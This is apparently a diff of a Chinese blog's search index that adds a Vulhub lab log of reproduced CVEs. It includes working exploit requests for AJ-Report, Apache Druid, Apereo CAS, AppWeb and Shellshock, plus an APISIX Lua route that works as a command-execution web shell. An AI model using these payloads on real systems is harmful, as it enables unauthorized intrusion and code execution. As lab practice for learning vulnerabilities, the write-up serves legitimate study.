@@ -11,23 +11,17 @@
       </tags>
   </entry>
   <entry>
-    <title>谁家达芬奇密码-CTF之crypto</title>
-    <url>/2024/10/09/%E8%B0%81%E5%AE%B6%E8%BE%BE%E8%8A%AC%E5%A5%87%E5%AF%86%E7%A0%81-CTF%E4%B9%8Bcrypto/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="开幕介绍-具体简介"><a href="#开幕介绍-具体简介" class="headerlink" title="开幕介绍&amp;具体简介"></a>开幕介绍&amp;具体简介</h2><span id="more"></span>
-
-<h2 id="我们来细说吧"><a href="#我们来细说吧" class="headerlink" title="我们来细说吧"></a>我们来细说吧</h2><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr>
-<blockquote>
-<p>We are just another visitor in a transient world.</p>
-</blockquote>
-</body></html>]]></content>
-  </entry>
-  <entry>
     <title>Vulhub记录</title>
     <url>/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="一脚踹开src的大门"><a href="#一脚踹开src的大门" class="headerlink" title="一脚踹开src的大门"></a>一脚踹开src的大门</h2><p>嘛 机缘巧合下开始练习src 总之先拿vulhub练练手</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="一脚踹开src的大门"><a href="#一脚踹开src的大门" class="headerlink" title="一脚踹开src的大门"></a>一脚踹开src的大门</h2><p>嘛 机缘巧合下开始练习src 总之先拿vulhub练练手<br>不完全统计下的进度: 35/185</p>
 <span id="more"></span>
 
 <p>漏洞很多 试点经典的 基本按着readme做</p>
+<h1 id="总结遇到的问题"><a href="#总结遇到的问题" class="headerlink" title="总结遇到的问题"></a>总结遇到的问题</h1><p>-我使用的环境是 <strong>docker for windows</strong> 因此会出现各种奇葩的问题 这里记录</p>
+<h2 id="换行符问题"><a href="#换行符问题" class="headerlink" title="换行符问题"></a>换行符问题</h2><p>关键词:(出现在常常闪退的容器环境的log中)</p>
+<pre class="line-numbers language-none"><code class="language-none">$'\r': command not found
+syntax error: unexpected end of file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>vulhub下自带文件有些只考虑了linux的换行符/文件格式 下载到windows会被自动转换<br>我使用了Git Bash 自带的工具 <code>dos2unix</code>转换文件至unix格式 至此就能正常运行了</p>
 <h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>至于创建环境和搭建环境 请自行练习docker的操作</p>
 <blockquote>
 <p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。<br>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
@@ -229,7 +223,764 @@ python exploit_airflow_celery.py [your-ip]<span aria-hidden="true" class="line-n
 <p>可以看到成功创建了文件<code>airflow_celery_success</code>：</p>
 </blockquote>
 <p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/25.jpg" alt="25"></p>
-<h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote>
+<h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><blockquote>
+<p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/14460">https://xz.aliyun.com/t/14460</a></li>
+<li><a href="https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>要利用该漏洞，只需要发送如下数据包：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+Host: your-ip:9095
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Content-Length: 339
+
+{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/26.jpg" alt="26"><br>可见，<code>id</code>命令已经执行成功：</p>
+<h1 id="Apache-Druid-代码执行漏洞（CVE-2021-25646）"><a href="#Apache-Druid-代码执行漏洞（CVE-2021-25646）" class="headerlink" title="Apache Druid 代码执行漏洞（CVE-2021-25646）"></a>Apache Druid 代码执行漏洞（CVE-2021-25646）</h1><blockquote>
+<p>Apache Druid是一个开源的分布式数据存储。</p>
+<p>Apache Druid包括执行嵌入在各种类型请求中的用户提供的JavaScript代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在Druid 0.20.0及以前的版本中，攻击者可以通过发送一个恶意请求使Druid用内置引擎执行任意JavaScript代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution">https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution</a></li>
+<li><a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>直接发送如下请求即可执行其中的JavaScript代码：</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">POST /druid/indexer/v1/sampler HTTP/1.1
+Host: your-ip:8888
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/json
+
+{
+    "type":"index",
+    "spec":{
+        "ioConfig":{
+            "type":"index",
+            "firehose":{
+                "type":"local",
+                "baseDir":"/etc",
+                "filter":"passwd"
+            }
+        },
+        "dataSchema":{
+            "dataSource":"test",
+            "parser":{
+                "parseSpec":{
+                "format":"javascript",
+                "timestampSpec":{
+
+                },
+                "dimensionsSpec":{
+
+                },
+                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
+                "":{
+                    "enabled":"true"
+                }
+                }
+            }
+        }
+    },
+    "samplerConfig":{
+        "numRows":10
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/27.jpg" alt="27"><br>可见，<code>id</code>命令已被成功执行：</p>
+<h1 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h1><blockquote>
+<p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://apereo.github.io/2016/04/08/commonsvulndisc/">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">public class EncryptedTranscoder implements Transcoder {
+    private CipherBean cipherBean;
+    private boolean compression = true;
+
+    public EncryptedTranscoder() throws IOException {
+        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
+        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
+        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
+        bufferedBlockCipherBean.setKeyAlias("aes128");
+        bufferedBlockCipherBean.setKeyPassword("changeit");
+        bufferedBlockCipherBean.setNonce(new RBGNonce());
+        this.setCipherBean(bufferedBlockCipherBean);
+    }
+
+    // ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/28.jpg" alt="28"></p>
+<blockquote>
+<p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /cas/login HTTP/1.1
+Host: your-ip
+Content-Length: 2287
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://your-ip:8080
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://your-ip:8080/cas/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
+Connection: close
+
+username=test&amp;password=test&amp;lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution=[payload]&amp;_eventId=submit&amp;submit=LOGIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/29.jpg" alt="29"></p>
+<blockquote>
+<p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/30.jpg" alt="30"></p>
+<h1 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h1><blockquote>
+<p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://apisix.apache.org/docs/apisix/getting-started">https://apisix.apache.org/docs/apisix/getting-started</a></li>
+<li><a href="https://github.com/apache/apisix/pull/2244">https://github.com/apache/apisix/pull/2244</a></li>
+<li><a href="https://seclists.org/oss-sec/2020/q4/187">https://seclists.org/oss-sec/2020/q4/187</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /apisix/admin/routes HTTP/1.1
+Host: your-ip:9080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+Content-Type: application/json
+Content-Length: 406
+
+{
+    "uri": "/attack",
+"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
+    "upstream": {
+        "type": "roundrobin",
+        "nodes": {
+            "example.com:80": 1
+        }
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/31.jpg" alt="31"></p>
+<blockquote>
+<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">http://your-ip:9080/attack?cmd=id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/32.jpg" alt="32"></p>
+<h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE（CVE-2021-45232）-未完成" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)"></a>Apache APISIX Dashboard API权限绕过导致RCE（CVE-2021-45232）(未完成)</h1><blockquote>
+<p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p>
+<p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/">https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/</a></li>
+<li><a href="https://github.com/wuppp/cve-2021-45232-exp">https://github.com/wuppp/cve-2021-45232-exp</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先用默认账号密码admin/vulhub来登录网站<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/33.jpg" alt="33"><br>注:默认账号密码可能会因为镜像版本不同而有变化 具体还请查看容器目录下的comfig.yaml</p>
+<p>登陆完之后进入路由页面 新建一个路由<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/34.jpg" alt="34"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/35.jpg" alt="35"><br>至于相关设置直接随意 快速下一步到创建就行了<br>在访问了网站的<code>/apisix/admin/migrate/export</code>目录后获取了一个bak文件 查看后可以发现我们刚刚配置的路由信息被泄露了<img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/36.jpg" alt="36"><br>剩下的过程不好复现 先暂且跳过</p>
+<h1 id="AppWeb认证绕过漏洞（CVE-2018-8715"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715)"></a>AppWeb认证绕过漏洞（CVE-2018-8715)</h1><blockquote>
+<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
+<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
+<ul>
+<li>basic 传统HTTP基础认证</li>
+<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
+<li>form 表单认证</li>
+</ul>
+<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p>
+<p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET / HTTP/1.1
+Host: example.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Authorization: Digest username=admin
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/37.jpg" alt="37"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/38.jpg" alt="38"></p>
+<blockquote>
+<p>设置这个session到浏览器，即可正常访问需要认证的页面：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/39.jpg" alt="39"></p>
+<h1 id="Aria2-任意文件写入漏洞-（未完成）"><a href="#Aria2-任意文件写入漏洞-（未完成）" class="headerlink" title="Aria2 任意文件写入漏洞 （未完成）"></a>Aria2 任意文件写入漏洞 （未完成）</h1><blockquote>
+<p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p>
+<p>参考文章：[<a href="https://paper.seebug.org/120/][1]">https://paper.seebug.org/120/][1]</a></p>
+</blockquote>
+<h2 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/">http://binux.github.io/yaaw/demo/</a> 。</p>
+<p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code></p>
+</blockquote>
+<p>这个多半需要公网环境… 回去再搞</p>
+<h1 id="Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）"><a href="#Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）" class="headerlink" title="Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）"></a>Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）</h1><blockquote>
+<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
+<p>将payload附在User-Agent中访问victim.cgi：</p>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>命令成功被执行：</p>
+</blockquote>
+<p>不知道为啥就是没有正常回显…</p>
+<h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)</h1><blockquote>
+<p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf">https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf</a></li>
+<li><a href="https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A">https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A</a></li>
+</ul>
+</blockquote>
+<p>8080端口的容器一开就死 跳了</p>
+<h1 id="Celery"><a href="#Celery" class="headerlink" title="Celery <4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h1><blockquote>
+<p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p>
+<p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p>
+</blockquote>
+<h2 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>漏洞利用脚本<code>exploit.py</code>仅支持在python3下使用</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip install redis
+python exploit.py [主机IP]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>查看结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">docker compose logs celery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/40.jpg" alt="40"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/41.jpg" alt="41"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/42.jpg" alt="42"></p>
+<h1 id="CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）"><a href="#CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）" class="headerlink" title="CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）"></a>CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）</h1><blockquote>
+<p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
+<p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p>
+<p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。CVE-2016-5385是PHP的CVE，HTTPoxy所有的CVE编号如下：</p>
+<ul>
+<li>CVE-2016-5385: PHP</li>
+<li>CVE-2016-5386: Go</li>
+<li>CVE-2016-5387: Apache HTTP Server</li>
+<li>CVE-2016-5388: Apache Tomcat</li>
+<li>CVE-2016-6286: spiffy-cgi-handlers for CHICKEN</li>
+<li>CVE-2016-6287: CHICKEN’s http-client</li>
+<li>CVE-2016-1000104: mod_fcgi</li>
+<li>CVE-2016-1000105: Nginx cgi script</li>
+<li>CVE-2016-1000107: Erlang inets</li>
+<li>CVE-2016-1000108: YAWS</li>
+<li>CVE-2016-1000109: HHVM FastCGI</li>
+<li>CVE-2016-1000110: Python CGIHandler</li>
+<li>CVE-2016-1000111: Python Twisted</li>
+<li>CVE-2016-1000212: lighttpd</li>
+</ul>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html">https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html</a></li>
+</ul>
+</blockquote>
+<h1 id="CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）"><a href="#CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）" class="headerlink" title="CMS Made Simple (CMSMS) < 2.2.10 前台SQL注入漏洞（CVE-2019-9053）"></a>CMS Made Simple (CMSMS) &lt; 2.2.10 前台SQL注入漏洞（CVE-2019-9053）</h1><blockquote>
+<p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p>
+<p>在 2.2.9.1 之前的版本中，CMS Made Simple 存在一个未验证的 SQL 注入漏洞，攻击者可利用该漏洞获取管理员密码或密码重置令牌。结合后台的 SSTI 漏洞（<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120">CVE-2021-26120</a>），攻击者可在目标服务器上执行任意代码。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li>
+<li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-15"><a href="#漏洞复现-15" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/43.jpg" alt="43"></p>
+<blockquote>
+<p>使用<a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a>中的脚本来利用SQL注入漏洞：</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">python2 poc.py -u http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
